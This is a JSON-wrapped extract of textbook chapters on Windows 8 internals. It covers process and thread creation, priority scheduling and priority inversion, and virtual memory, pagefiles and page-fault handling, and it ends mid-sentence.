            "content": "11.4.3 Implementation of Processes and Threads\r\nIn this section we will get into more detail about how Windows creates a proc\u0002ess (and the initial thread). Because Win32 is the most documented interface, we\r\nwill start there. But we will quickly work our way down into the kernel and under\u0002stand the implementation of the native API call for creating a new process. We\r\nwill focus on the main code paths that get executed whenever processes are creat\u0002ed, as well as look at a few of the details that fill in gaps in what we have covered\r\nso far.\r\nA process is created when another process makes the Win32 CreateProcess\r\ncall. This call invokes a user-mode procedure in kernel32.dll that makes a call to\r\nNtCreateUserProcess in the kernel to create the process in several steps.\r\n1. Convert the executable file name given as a parameter from a Win32\r\npath name to an NT path name. If the executable has just a name\r\nwithout a directory path name, it is searched for in the directories list\u0002ed in the default directories (which include, but are not limited to,\r\nthose in the PATH variable in the environment).\n920 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nWin32 API Function Description\r\nCreateProcess Create a new process\r\nCreateThread Create a new thread in an existing process\r\nCreateFiber Create a new fiber\r\nExitProcess Ter minate current process and all its threads\r\nExitThread Ter minate this thread\r\nExitFiber Ter minate this fiber\r\nSwitchToFiber Run a different fiber on the current thread\r\nSetPr ior ityClass Set the prior ity class for a process\r\nSetThreadPr ior ity Set the prior ity for one thread\r\nCreateSemaphore Create a new semaphore\r\nCreateMutex Create a new mutex\r\nOpenSemaphore Open an existing semaphore\r\nOpenMutex Open an existing mutex\r\nWaitForSingleObject Block on a single semaphore, mutex, etc.\r\nWaitForMultipleObjects Block on a set of objects whose handles are given\r\nPulseEvent Set an event to signaled, then to nonsignaled\r\nReleaseMutex Release a mutex to allow another thread to acquire it\r\nReleaseSemaphore Increase the semaphore count by 1\r\nEnterCr iticalSection Acquire the lock on a critical section\r\nLeaveCr iticalSection Release the lock on a critical section\r\nWaitOnAddress Block until the memory is changed at the specified address\r\nWakeByAddressSingle Wake the first thread that is waiting on this address\r\nWakeByAddressAll Wake all threads that are waiting on this address\r\nInitOnceExecuteOnce Ensure that an initialize routine executes only once\r\nFigure 11-24. Some of the Win32 calls for managing processes, threads,\r\nand fibers.\r\n2. Bundle up the process-creation parameters and pass them, along with\r\nthe full path name of the executable program, to the native API\r\nNtCreateUserProcess.\r\n3. Running in kernel mode, NtCreateUserProcess processes the parame\u0002ters, then opens the program image and creates a section object that\r\ncan be used to map the program into the new process’ virtual address\r\nspace.\r\n4. The process manager allocates and initializes the process object (the\r\nkernel data structure representing a process to both the kernel and ex\u0002ecutive layers).\nSEC. 11.4 PROCESSES AND THREADS IN WINDOWS 921\r\n5. The memory manager creates the address space for the new process\r\nby allocating and initializing the page directories and the virtual ad\u0002dress descriptors which describe the kernel-mode portion, including\r\nthe process-specific regions, such as the self-map page-directory en\u0002tries that gives each process kernel-mode access to the physical pages\r\nin its entire page table using kernel virtual addresses. (We will de\u0002scribe the self map in more detail in Sec. 11.5.)\r\n6. A handle table is created for the new process, and all the handles from\r\nthe caller that are allowed to be inherited are duplicated into it.\r\n7. The shared user page is mapped, and the memory manager initializes\r\nthe working-set data structures used for deciding what pages to trim\r\nfrom a process when physical memory is low. The pieces of the ex\u0002ecutable image represented by the section object are mapped into the\r\nnew process’ user-mode address space.\r\n8. The executive creates and initializes the user-mode PEB, which is\r\nused by both user mode processes and the kernel to maintain proc\u0002esswide state information, such as the user-mode heap pointers and\r\nthe list of loaded libraries (DLLs).\r\n9. Virtual memory is allocated in the new process and used to pass pa\u0002rameters, including the environment strings and command line.\r\n10. A process ID is allocated from the special handle table (ID table) the\r\nkernel maintains for efficiently allocating locally unique IDs for proc\u0002esses and threads.\r\n11. A thread object is allocated and initialized. A user-mode stack is al\u0002located along with the Thread Environment Block (TEB). The CON\u0002TEXT record which contains the thread’s initial values for the CPU\r\nregisters (including the instruction and stack pointers) is initialized.\r\n12. The process object is added to the global list of processes. Handles\r\nfor the process and thread objects are allocated in the caller’s handle\r\ntable. An ID for the initial thread is allocated from the ID table.\r\n13. NtCreateUserProcess returns to user mode with the new process\r\ncreated, containing a single thread that is ready to run but suspended.\r\n14. If the NT API fails, the Win32 code checks to see if this might be a\r\nprocess belonging to another subsystem like WOW64. Or perhaps\r\nthe program is marked that it should be run under the debugger.\r\nThese special cases are handled with special code in the user-mode\r\nCreateProcess code.\n922 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\n15. If NtCreateUserProcess was successful, there is still some work to be\r\ndone. Win32 processes have to be registered with the Win32 subsys\u0002tem process, csrss.exe. Kernel32.dll sends a message to csrss telling it\r\nabout the new process along with the process and thread handles so it\r\ncan duplicate itself. The process and threads are entered into the\r\nsubsystems’ tables so that they hav e a complete list of all Win32\r\nprocesses and threads. The subsystem then displays a cursor con\u0002taining a pointer with an hourglass to tell the user that something is\r\ngoing on but that the cursor can be used in the meanwhile. When the\r\nprocess makes its first GUI call, usually to create a window, the cur\u0002sor is removed (it times out after 2 seconds if no call is forthcoming).\r\n16. If the process is restricted, such as low-rights Internet Explorer, the\r\ntoken is modified to restrict what objects the new process can access.\r\n17. If the application program was marked as needing to be shimmed to\r\nrun compatibly with the current version of Windows, the specified\r\nshims are applied. Shims usually wrap library calls to slightly modi\u0002fy their behavior, such as returning a fake version number or delaying\r\nthe freeing of memory.\r\n18. Finally, call NtResumeThread to unsuspend the thread, and return the\r\nstructure to the caller containing the IDs and handles for the process\r\nand thread that were just created.\r\nIn earlier versions of Windows, much of the algorithm for process creation was im\u0002plemented in the user-mode procedure which would create a new process in using\r\nmultiple system calls and by performing other work using the NT native APIs that\r\nsupport implementation of subsystems. These steps were moved into the kernel to\r\nreduce the ability of the parent process to manipulate the child process in the cases\r\nwhere the child is running a protected program, such as one that implements DRM\r\nto protect movies from piracy.\r\nThe original native API, NtCreateProcess, is still supported by the system, so\r\nmuch of process creation could still be done within user mode of the parent proc\u0002ess—as long as the process being created is not a protected process.\r\nScheduling\r\nThe Windows kernel does not have a central scheduling thread. Instead, when\r\na thread cannot run any more, the thread calls into the scheduler itself to see which\r\nthread to switch to. The following conditions invoke scheduling.\r\n1. A running thread blocks on a semaphore, mutex, event, I/O, etc.\r\n2. The thread signals an object (e.g., does an up on a semaphore).\r\n3. The quantum expires.\nSEC. 11.4 PROCESSES AND THREADS IN WINDOWS 923\r\nIn case 1, the thread is already in the kernel to carry out the operation on the dis\u0002patcher or I/O object. It cannot possibly continue, so it calls the scheduler code to\r\npick its successor and load that thread’s CONTEXT record to resume running it.\r\nIn case 2, the running thread is in the kernel, too. However, after signaling\r\nsome object, it can definitely continue because signaling an object never blocks.\r\nStill, the thread is required to call the scheduler to see if the result of its action has\r\nreleased a thread with a higher scheduling priority that is now ready to run. If so, a\r\nthread switch occurs since Windows is fully preemptive (i.e., thread switches can\r\noccur at any moment, not just at the end of the current thread’s quantum). Howev\u0002er, in the case of a multicore chip or a multiprocessor, a thread that was made ready\r\nmay be scheduled on a different CPU and the original thread can continue to ex\u0002ecute on the current CPU even though its scheduling priority is lower.\r\nIn case 3, an interrupt to kernel mode occurs, at which point the thread ex\u0002ecutes the scheduler code to see who runs next. Depending on what other threads\r\nare waiting, the same thread may be selected, in which case it gets a new quantum\r\nand continues running. Otherwise a thread switch happens.\r\nThe scheduler is also called under two other conditions:\r\n1. An I/O operation completes.\r\n2. A timed wait expires.\r\nIn the first case, a thread may have been waiting on this I/O and is now released to\r\nrun. A check has to be made to see if it should preempt the running thread since\r\nthere is no guaranteed minimum run time. The scheduler is not run in the interrupt\r\nhandler itself (since that may keep interrupts turned off too long). Instead, a DPC\r\nis queued for slightly later, after the interrupt handler is done. In the second case, a\r\nthread has done a down on a semaphore or blocked on some other object, but with\r\na timeout that has now expired. Again it is necessary for the interrupt handler to\r\nqueue a DPC to avoid having it run during the clock interrupt handler. If a thread\r\nhas been made ready by this timeout, the scheduler will be run and if the newly\r\nrunnable thread has higher priority, the current thread is preempted as in case 1.\r\nNow we come to the actual scheduling algorithm. The Win32 API provides\r\ntwo APIs to influence thread scheduling. First, there is a call SetPr ior ityClass that\r\nsets the priority class of all the threads in the caller’s process. The allowed values\r\nare: real-time, high, above normal, normal, below normal, and idle. The priority\r\nclass determines the relative priorities of processes. The process priority class can\r\nalso be used by a process to temporarily mark itself as being background, meaning\r\nthat it should not interfere with any other activity in the system. Note that the pri\u0002ority class is established for the process, but it affects the actual priority of every\r\nthread in the process by setting a base priority that each thread starts with when\r\ncreated.\r\nThe second Win32 API is SetThreadPr ior ity. It sets the relative priority of a\r\nthread (possibly, but not necessarily, the calling thread) with respect to the priority\n924 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nclass of its process. The allowed values are: time critical, highest, above normal,\r\nnormal, below normal, lowest, and idle. Time-critical threads get the highest non\u0002real-time scheduling priority, while idle threads get the lowest, irrespective of the\r\npriority class. The other priority values adjust the base priority of a thread with re\u0002spect to the normal value determined by the priority class (+2, +1, 0, −1, −2, re\u0002spectively). The use of priority classes and relative thread priorities makes it easier\r\nfor applications to decide what priorities to specify.\r\nThe scheduler works as follows. The system has 32 priorities, numbered from\r\n0 to 31. The combinations of priority class and relative priority are mapped onto\r\n32 absolute thread priorities according to the table of Fig. 11-25. The number in\r\nthe table determines the thread’s base priority. In addition, every thread has a\r\ncurrent priority, which may be higher (but not lower) than the base priority and\r\nwhich we will discuss shortly.\r\nWin32 process class priorities\r\nAbove Below\r\nReal-time High normal Normal normal Idle\r\nTime critical 31 15 15 15 15 15\r\nHighest 26 15 12 10 8 6\r\nWin32 Above normal 25 14 11 9 7 5\r\nthread Normal 24 13 10 8 6 4\r\npriorities Below normal 23 12 9 7 5 3\r\nLowest 22 11 8 6 4 2\r\nIdle 16 1 1 1 1 1\r\nFigure 11-25. Mapping of Win32 priorities to Windows priorities.\r\nTo use these priorities for scheduling, the system maintains an array of 32 lists\r\nof threads, corresponding to priorities 0 through 31 derived from the table of\r\nFig. 11-25. Each list contains ready threads at the corresponding priority. The\r\nbasic scheduling algorithm consists of searching the array from priority 31 down to\r\npriority 0. As soon as a nonempty list is found, the thread at the head of the queue\r\nis selected and run for one quantum. If the quantum expires, the thread goes to the\r\nend of the queue at its priority level and the thread at the front is chosen next. In\r\nother words, when there are multiple threads ready at the highest priority level,\r\nthey run round robin for one quantum each. If no thread is ready, the processor is\r\nidled—that is, set to a low power state waiting for an interrupt to occur.\r\nIt should be noted that scheduling is done by picking a thread without regard to\r\nwhich process that thread belongs. Thus, the scheduler does not first pick a proc\u0002ess and then pick a thread in that process. It only looks at the threads. It does not\r\nconsider which thread belongs to which process except to determine if it also needs\r\nto switch address spaces when switching threads.\nSEC. 11.4 PROCESSES AND THREADS IN WINDOWS 925\r\nTo improve the scalability of the scheduling algorithm for multiprocessors with\r\na high number of processors, the scheduler tries hard not to have to take the lock\r\nthat protects access to the global array of priority lists. Instead, it sees if it can di\u0002rectly dispatch a thread that is ready to run to the processor where it should run.\r\nFor each thread the scheduler maintains the notion of its ideal processor and\r\nattempts to schedule it on that processor whenever possible. This improves the\r\nperformance of the system, as the data used by a thread are more likely to already\r\nbe available in the cache belonging to its ideal processor. The scheduler is aware\r\nof multiprocessors in which each CPU has its own memory and which can execute\r\nprograms out of any memory—but at a cost if the memory is not local. These sys\u0002tems are called NUMA (NonUniform Memory Access) machines. The scheduler\r\ntries to optimize thread placement on such machines. The memory manager tries\r\nto allocate physical pages in the NUMA node belonging to the ideal processor for\r\nthreads when they page fault.\r\nThe array of queue headers is shown in Fig. 11-26. The figure shows that there\r\nare actually four categories of priorities: real-time, user, zero, and idle, which is ef\u0002fectively −1. These deserve some comment. Priorities 16–31 are called system,\r\nand are intended to build systems that satisfy real-time constraints, such as dead\u0002lines needed for multimedia presentations. Threads with real-time priorities run\r\nbefore any of the threads with dynamic priorities, but not before DPCs and ISRs.\r\nIf a real-time application wants to run on the system, it may require device drivers\r\nthat are careful not to run DPCs or ISRs for any extended time as they might cause\r\nthe real-time threads to miss their deadlines.\r\nOrdinary users may not run real-time threads. If a user thread ran at a higher\r\npriority than, say, the keyboard or mouse thread and got into a loop, the keyboard\r\nor mouse thread would never run, effectively hanging the system. The right to set\r\nthe priority class to real-time requires a special privilege to be enabled in the proc\u0002ess’ token. Normal users do not have this privilege.\r\nApplication threads normally run at priorities 1–15. By setting the process and\r\nthread priorities, an application can determine which threads get preference. The\r\nZeroPage system threads run at priority 0 and convert free pages into pages of all\r\nzeroes. There is a separate ZeroPage thread for each real processor.\r\nEach thread has a base priority based on the priority class of the process and\r\nthe relative priority of the thread. But the priority used for determining which of\r\nthe 32 lists a ready thread is queued on is determined by its current priority, which\r\nis normally the same as the base priority—but not always. Under certain condi\u0002tions, the current priority of a nonreal-time thread is boosted by the kernel above\r\nthe base priority (but never above priority 15). Since the array of Fig. 11-26 is\r\nbased on the current priority, changing this priority affects scheduling. No adjust\u0002ments are ever made to real-time threads.\r\nLet us now see when a thread’s priority is raised. First, when an I/O operation\r\ncompletes and releases a waiting thread, the priority is boosted to give it a chance\r\nto run again quickly and start more I/O. The idea here is to keep the I/O devices\n926 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nNext thread to run\r\nPriority\r\nSystem\r\npriorities\r\nUser\r\npriorities\r\nZero page thread\r\n31\r\n24\r\n16\r\n8\r\n1\r\n0\r\nIdle thread\r\nFigure 11-26. Windows supports 32 priorities for threads.\r\nbusy. The amount of boost depends on the I/O device, typically 1 for a disk, 2 for\r\na serial line, 6 for the keyboard, and 8 for the sound card.\r\nSecond, if a thread was waiting on a semaphore, mutex, or other event, when it\r\nis released, it gets boosted by 2 levels if it is in the foreground process (the process\r\ncontrolling the window to which keyboard input is sent) and 1 level otherwise.\r\nThis fix tends to raise interactive processes above the big crowd at level 8. Finally,\r\nif a GUI thread wakes up because window input is now available, it gets a boost for\r\nthe same reason.\r\nThese boosts are not forever. They take effect immediately, and can cause\r\nrescheduling of the CPU. But if a thread uses all of its next quantum, it loses one\r\npriority level and moves down one queue in the priority array. If it uses up another\r\nfull quantum, it moves down another level, and so on until it hits its base level,\r\nwhere it remains until it is boosted again.\r\nThere is one other case in which the system fiddles with the priorities. Imag\u0002ine that two threads are working together on a producer-consumer type problem.\r\nThe producer’s work is harder, so it gets a high priority, say 12, compared to the\r\nconsumer’s 4. At a certain point, the producer has filled up a shared buffer and\r\nblocks on a semaphore, as illustrated in Fig. 11-27(a).\r\nBefore the consumer gets a chance to run again, an unrelated thread at priority\r\n8 becomes ready and starts running, as shown in Fig. 11-27(b). As long as this\r\nthread wants to run, it will be able to, since it has a higher priority than the consu\u0002mer, and the producer, though even higher, is blocked. Under these circumstances,\r\nthe producer will never get to run again until the priority 8 thread gives up. This\nSEC. 11.4 PROCESSES AND THREADS IN WINDOWS 927\r\n12\r\n4\r\n8\r\n12\r\nDoes a down on the\r\nsemaphore and blocks\r\nSemaphone Semaphone\r\nBlocked\r\nRunning\r\nReady\r\nWaiting on the semaphore\r\nWould like to do an up\r\non the semaphore but\r\nnever gets scheduled\r\n(a) (b)\r\nFigure 11-27. An example of priority inversion.\r\nproblem is well known under the name priority inversion. Windows addresses\r\npriority inversion between kernel threads through a facility in the thread scheduler\r\ncalled Autoboost. Autoboost automatically tracks resource dependencies between\r\nthreads and boosts the scheduling priority of threads that hold resources needed by\r\nhigher-priority threads.\r\nWindows runs on PCs, which usually have only a single interactive session ac\u0002tive at a time. However, Windows also supports a terminal server mode which\r\nsupports multiple interactive sessions over the network using RDP (Remote Desk\u0002top Protocol). When running multiple user sessions, it is easy for one user to in\u0002terfere with another by consuming too much processor resources. Windows imple\u0002ments a fair-share algorithm, DFSS (Dynamic Fair-Share Scheduling), which\r\nkeeps sessions from running excessively. DFSS uses scheduling groups to\r\norganize the threads in each session. Within each group the threads are scheduled\r\naccording to normal Windows scheduling policies, but each group is given more or\r\nless access to the processors based on how much the group has been running in\r\naggregate. The relative priorities of the groups are adjusted slowly to allow ignore\r\nshort bursts of activity and reduce the amount a group is allowed to run only if it\r\nuses excessive processor time over long periods."
          }
        }
      },
      "11.5 MEMORY MANAGEMENT": {
        "page": 958,
        "children": {
          "11.5.1 Fundamental Concepts": {
            "page": 959,
            "content": "11.5.1 Fundamental Concepts\r\nIn Windows, every user process has its own virtual address space. For x86 ma\u0002chines, virtual addresses are 32 bits long, so each process has 4 GB of virtual ad\u0002dress space, with the user and kernel each receiving 2 GB. For x64 machines, both\r\nthe user and kernel receive more virtual addresses than they can reasonably use in\r\nthe foreseeable future. For both x86 and x64, the virtual address space is demand\r\npaged, with a fixed page size of 4 KB—though in some cases, as we will see short\u0002ly, 2-MB large pages are also used (by using a page directory only and bypassing\r\nthe corresponding page table).\r\nThe virtual address space layouts for three x86 processes are shown in\r\nFig. 11-28 in simplified form. The bottom and top 64 KB of each process’ virtual\r\naddress space is normally unmapped. This choice was made intentionally to help\r\ncatch programming errors and mitigate the exploitability of certain types of vulner\u0002abilities.\r\nProcess A\r\n4 GB\r\n2 GB\r\n0\r\nNonpaged pool\r\nPaged pool\r\nA's page tables\r\nStacks, data, etc\r\nHAL + OS\r\nSystem data\r\nProcess A's\r\nprivate code\r\nand data\r\nProcess B\r\nNonpaged pool\r\nPaged pool\r\nB's page tables\r\nStacks, data, etc\r\nHAL + OS\r\nSystem data\r\nProcess B's\r\nprivate code\r\nand data\r\nProcess C\r\nNonpaged pool\r\nPaged pool\r\nC's page tables\r\nStacks, data, etc\r\nHAL + OS\r\nSystem data\r\nProcess C's\r\nprivate code\r\nand data\r\nBottom and top\r\n64 KB are invalid\r\nFigure 11-28. Virtual address space layout for three user processes on the x86.\r\nThe white areas are private per process. The shaded areas are shared among all\r\nprocesses.\r\nStarting at 64 KB comes the user’s private code and data. This extends up to\r\nalmost 2 GB. The upper 2 GB contains the operating system, including the code,\r\ndata, and the paged and nonpaged pools. The upper 2 GB is the kernel’s virtual\r\nmemory and is shared among all user processes, except for virtual memory data\r\nlike the page tables and working-set lists, which are per-process. Kernel virtual\nSEC. 11.5 MEMORY MANAGEMENT 929\r\nmemory is accessible only while running in kernel mode. The reason for sharing\r\nthe process’ virtual memory with the kernel is that when a thread makes a system\r\ncall, it traps into kernel mode and can continue running without changing the mem\u0002ory map. All that has to be done is switch to the thread’s kernel stack. From a per\u0002formance point of view, this is a big win, and something UNIX does as well. Be\u0002cause the process’ user-mode pages are still accessible, the kernel-mode code can\r\nread parameters and access buffers without having to switch back and forth be\u0002tween address spaces or temporarily double-map pages into both. The trade-off\r\nhere is less private address space per process in return for faster system calls.\r\nWindows allows threads to attach themselves to other address spaces while\r\nrunning in the kernel. Attachment to an address space allows the thread to access\r\nall of the user-mode address space, as well as the portions of the kernel address\r\nspace that are specific to a process, such as the self-map for the page tables.\r\nThreads must switch back to their original address space before returning to user\r\nmode.\r\nVirtual Address Allocation\r\nEach page of virtual addresses can be in one of three states: invalid, reserved,\r\nor committed. An invalid page is not currently mapped to a memory section ob\u0002ject and a reference to it causes a page fault that results in an access violation.\r\nOnce code or data is mapped onto a virtual page, the page is said to be committed.\r\nA page fault on a committed page results in mapping the page containing the virtu\u0002al address that caused the fault onto one of the pages represented by the section ob\u0002ject or stored in the pagefile. Often this will require allocating a physical page and\r\nperforming I/O on the file represented by the section object to read in the data from\r\ndisk. But page faults can also occur simply because the page-table entry needs to\r\nbe updated, as the physical page referenced is still cached in memory, in which\r\ncase I/O is not required. These are called soft faults and we will discuss them in\r\nmore detail shortly.\r\nA virtual page can also be in the reserved state. A reserved virtual page is\r\ninvalid but has the property that those virtual addresses will never be allocated by\r\nthe memory manager for another purpose. As an example, when a new thread is\r\ncreated, many pages of user-mode stack space are reserved in the process’ virtual\r\naddress space, but only one page is committed. As the stack grows, the virtual\r\nmemory manager will automatically commit additional pages under the covers,\r\nuntil the reservation is almost exhausted. The reserved pages function as guard\r\npages to keep the stack from growing too far and overwriting other process data.\r\nReserving all the virtual pages means that the stack can eventually grow to its max\u0002imum size without the risk that some of the contiguous pages of virtual address\r\nspace needed for the stack might be given away for another purpose. In addition to\r\nthe invalid, reserved, and committed attributes, pages also have other attributes,\r\nsuch as being readable, writable, and executable.\n930 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nPagefiles\r\nAn interesting trade-off occurs with assignment of backing store to committed\r\npages that are not being mapped to specific files. These pages use the pagefile.\r\nThe question is how and when to map the virtual page to a specific location in the\r\npagefile. A simple strategy would be to assign each virtual page to a page in one\r\nof the paging files on disk at the time the virtual page was committed. This would\r\nguarantee that there was always a known place to write out each committed page\r\nshould it be necessary to evict it from memory.\r\nWindows uses a just-in-time strategy. Committed pages that are backed by the\r\npagefile are not assigned space in the pagefile until the time that they hav e to be\r\npaged out. No disk space is allocated for pages that are never paged out. If the\r\ntotal virtual memory is less than the available physical memory, a pagefile is not\r\nneeded at all. This is convenient for embedded systems based on Windows. It is\r\nalso the way the system is booted, since pagefiles are not initialized until the first\r\nuser-mode process, smss.exe, begins running.\r\nWith a preallocation strategy the total virtual memory in the system used for\r\nprivate data (stacks, heap, and copy-on-write code pages) is limited to the size of\r\nthe pagefiles. With just-in-time allocation the total virtual memory can be almost\r\nas large as the combined size of the pagefiles and physical memory. With disks so\r\nlarge and cheap vs. physical memory, the savings in space is not as significant as\r\nthe increased performance that is possible.\r\nWith demand-paging, requests to read pages from disk need to be initiated\r\nright away, as the thread that encountered the missing page cannot continue until\r\nthis page-in operation completes. The possible optimizations for faulting pages in\u0002to memory involve attempting to prepage additional pages in the same I/O opera\u0002tion. However, operations that write modified pages to disk are not normally syn\u0002chronous with the execution of threads. The just-in-time strategy for allocating\r\npagefile space takes advantage of this to boost the performance of writing modified\r\npages to the pagefile. Modified pages are grouped together and written in big\r\nchunks. Since the allocation of space in the pagefile does not happen until the\r\npages are being written, the number of seeks required to write a batch of pages can\r\nbe optimized by allocating the pagefile pages to be near each other, or even making\r\nthem contiguous.\r\nWhen pages stored in the pagefile are read into memory, they keep their alloca\u0002tion in the pagefile until the first time they are modified. If a page is never modi\u0002fied, it will go onto a special list of free physical pages, called the standby list,\r\nwhere it can be reused without having to be written back to disk. If it is modified,\r\nthe memory manager will free the pagefile page and the only copy of the page will\r\nbe in memory. The memory manager implements this by marking the page as\r\nread-only after it is loaded. The first time a thread attempts to write the page the\r\nmemory manager will detect this situation and free the pagefile page, grant write\r\naccess to the page, and then have the thread try again.\nSEC. 11.5 MEMORY MANAGEMENT 931\r\nWindows supports up to 16 pagefiles, normally spread out over separate disks\r\nto achieve higher I/O bandwidth. Each one has an initial size and a maximum size\r\nit can grow to later if needed, but it is better to create these files to be the maxi\u0002mum size at system installation time. If it becomes necessary to grow a pagefile\r\nwhen the file system is much fuller, it is likely that the new space in the pagefile\r\nwill be highly fragmented, reducing performance.\r\nThe operating system keeps track of which virtual page maps onto which part\r\nof which paging file by writing this information into the page-table entries for the\r\nprocess for private pages, or into prototype page-table entries associated with the\r\nsection object for shared pages. In addition to the pages that are backed by the\r\npagefile, many pages in a process are mapped to regular files in the file system.\r\nThe executable code and read-only data in a program file (e.g., an EXE or\r\nDLL) can be mapped into the address space of whatever process is using it. Since\r\nthese pages cannot be modified, they nev er need to be paged out but the physical\r\npages can just be immediately reused after the page-table mappings are all marked\r\nas invalid. When the page is needed again in the future, the memory manager will\r\nread the page in from the program file.\r\nSometimes pages that start out as read-only end up being modified, for ex\u0002ample, setting a breakpoint in the code when debugging a process, or fixing up\r\ncode to relocate it to different addresses within a process, or making modifications\r\nto data pages that started out shared. In cases like these, Windows, like most mod\u0002ern operating systems, supports a type of page called copy-on-write. These pages\r\nstart out as ordinary mapped pages, but when an attempt is made to modify any\r\npart of the page the memory manager makes a private, writable copy. It then\r\nupdates the page table for the virtual page so that it points at the private copy and\r\nhas the thread retry the write—which will now succeed. If that copy later needs to\r\nbe paged out, it will be written to the pagefile rather than the original file,\r\nBesides mapping program code and data from EXE and DLL files, ordinary\r\nfiles can be mapped into memory, allowing programs to reference data from files\r\nwithout doing read and write operations. I/O operations are still needed, but they\r\nare provided implicitly by the memory manager using the section object to repres\u0002ent the mapping between pages in memory and the blocks in the files on disk.\r\nSection objects do not have to refer to a file. They can refer to anonymous re\u0002gions of memory. By mapping anonymous section objects into multiple processes,\r\nmemory can be shared without having to allocate a file on disk. Since sections can\r\nbe given names in the NT namespace, processes can rendezvous by opening sec\u0002tions by name, as well as by duplicating and passing handles between processes."
          },
          "11.5.2 Memory-Management System Calls": {
            "page": 962,
            "content": "11.5.2 Memory-Management System Calls\r\nThe Win32 API contains a number of functions that allow a process to manage\r\nits virtual memory explicitly. The most important of these functions are listed in\r\nFig. 11-29. All of them operate on a region consisting of either a single page or a\n932 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nsequence of two or more pages that are consecutive in the virtual address space.\r\nOf course, processes do not have to manage their memory; paging happens auto\u0002matically, but these calls give processes additional power and flexibility.\r\nWin32 API function Description\r\nVir tualAlloc Reser ve or commit a region\r\nVir tualFree Release or decommit a region\r\nVir tualProtect Change the read/write/execute protection on a region\r\nVir tualQuery Inquire about the status of a region\r\nVir tualLock Make a region memory resident (i.e., disable paging for it)\r\nVir tualUnlock Make a region pageable in the usual way\r\nCreateFileMapping Create a file-mapping object and (optionally) assign it a name\r\nMapViewOfFile Map (par t of) a file into the address space\r\nUnmapViewOfFile Remove a mapped file from the address space\r\nOpenFileMapping Open a previously created file-mapping object\r\nFigure 11-29. The principal Win32 API functions for managing virtual memory\r\nin Windows.\r\nThe first four API functions are used to allocate, free, protect, and query re\u0002gions of virtual address space. Allocated regions always begin on 64-KB bound\u0002aries to minimize porting problems to future architectures with pages larger than\r\ncurrent ones. The actual amount of address space allocated can be less than 64\r\nKB, but must be a multiple of the page size. The next two APIs give a process the\r\nability to hardwire pages in memory so they will not be paged out and to undo this\r\nproperty. A real-time program might need pages with this property to avoid page\r\nfaults to disk during critical operations, for example. A limit is enforced by the op\u0002erating system to prevent processes from getting too greedy. The pages actually\r\ncan be removed from memory, but only if the entire process is swapped out. When\r\nit is brought back, all the locked pages are reloaded before any thread can start run\u0002ning again. Although not shown in Fig. 11-29, Windows also has native API func\u0002tions to allow a process to access the virtual memory of a different process over\r\nwhich it has been given control, that is, for which it has a handle (see Fig. 11-7).\r\nThe last four API functions listed are for managing memory-mapped files. To\r\nmap a file, a file-mapping object must first be created with CreateFileMapping (see\r\nFig. 11-8). This function returns a handle to the file-mapping object (i.e., a section\r\nobject) and optionally enters a name for it into the Win32 namespace so that other\r\nprocesses can use it, too. The next two functions map and unmap views on section\r\nobjects from a process’ virtual address space. The last API can be used by a proc\u0002ess to map share a mapping that another process created with CreateFileMapping,\r\nusually one created to map anonymous memory. In this way, two or more proc\u0002esses can share regions of their address spaces. This technique allows them to\r\nwrite in limited regions of each other’s virtual memory.\nSEC. 11.5 MEMORY MANAGEMENT 933"
          },
          "11.5.3 Implementation of Memory Management": {
            "page": 964,
            "content": "11.5.3 Implementation of Memory Management\r\nWindows, on the x86, supports a single linear 4-GB demand-paged address\r\nspace per process. Segmentation is not supported in any form. Theoretically, page\r\nsizes can be any power of 2 up to 64 KB. On the x86 they are normally fixed at 4\r\nKB. In addition, the operating system can use 2-MB large pages to improve the ef\u0002fectiveness of the TLB (Translation Lookaside Buffer) in the processor’s memo\u0002ry management unit. Use of 2-MB large pages by the kernel and large applications\r\nsignificantly improves performance by improving the hit rate for the TLB and\r\nreducing the number of times the page tables have to be walked to find entries that\r\nare missing from the TLB.\r\nProcess A Process B\r\nBacking store on disk\r\nPaging file\r\nLib.dll\r\nProg1.exe Prog2.exe\r\nProgram\r\nProgram\r\nShared\r\nlibrary\r\nShared\r\nlibrary\r\nData\r\nStack Stack\r\nRegion Data\r\nFigure 11-30. Mapped regions with their shadow pages on disk. The lib.dll file\r\nis mapped into two address spaces at the same time.\r\nUnlike the scheduler, which selects individual threads to run and does not care\r\nmuch about processes, the memory manager deals entirely with processes and does\r\nnot care much about threads. After all, processes, not threads, own the address\r\nspace and that is what the memory manager is concerned with. When a region of\r\nvirtual address space is allocated, as four of them have been for process A in\r\nFig. 11-30, the memory manager creates a VAD (Virtual Address Descriptor) for\r\nit, listing the range of addresses mapped, the section representing the backing store\r\nfile and offset where it is mapped, and the permissions. When the first page is\r\ntouched, the directory of page tables is created and its physical address is inserted\r\ninto the process object. An address space is completely defined by the list of its\r\nVADs. The VADs are organized into a balanced tree, so that the descriptor for a\n934 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nparticular address can be found efficiently. This scheme supports sparse address\r\nspaces. Unused areas between the mapped regions use no resources (memory or\r\ndisk) so they are essential free.\r\nPage-Fault Handling\r\nWhen a process starts on Windows, many of the pages mapping the program’s\r\nEXE and DLL image files may already be in memory because they are shared with\r\nother processes. The writable pages of the images are marked copy-on-write so\r\nthat they can be shared up to the point they need to be modified. If the operating\r\nsystem recognizes the EXE from a previous execution, it may have recorded the\r\npage-reference pattern, using a technology Microsoft calls SuperFetch. Super\u0002Fetch attempts to prepage many of the needed pages even though the process has\r\nnot faulted on them yet. This reduces the latency for starting up applications by\r\noverlapping the reading of the pages from disk with the execution of the ini\u0002tialization code in the images. It improves throughput to disk because it is easier\r\nfor the disk drivers to organize the reads to reduce the seek time needed. Process\r\nprepaging is also used during boot of the system, when a background application\r\nmoves to the foreground, and when restarting the system after hibernation.\r\nPrepaging is supported by the memory manager, but implemented as a separate\r\ncomponent of the system. The pages brought in are not inserted into the process’\r\npage table, but instead are inserted into the standby list from which they can quick\u0002ly be inserted into the process as needed without accessing the disk.\r\nNonmapped pages are slightly different in that they are not initialized by read\u0002ing from the file. Instead, the first time a nonmapped page is accessed the memory\r\nmanager provides a new physical page, making sure the contents are all zeroes (for\r\nsecurity reasons). On subsequent faults a nonmapped page may need to be found\r\nin memory or else must be read back from the pagefile.\r\nDemand paging in the memory manager is driven by page faults. On each\r\npage fault, a trap to the kernel occurs. The kernel then builds a machine-indepen\u0002dent descriptor telling what happened and 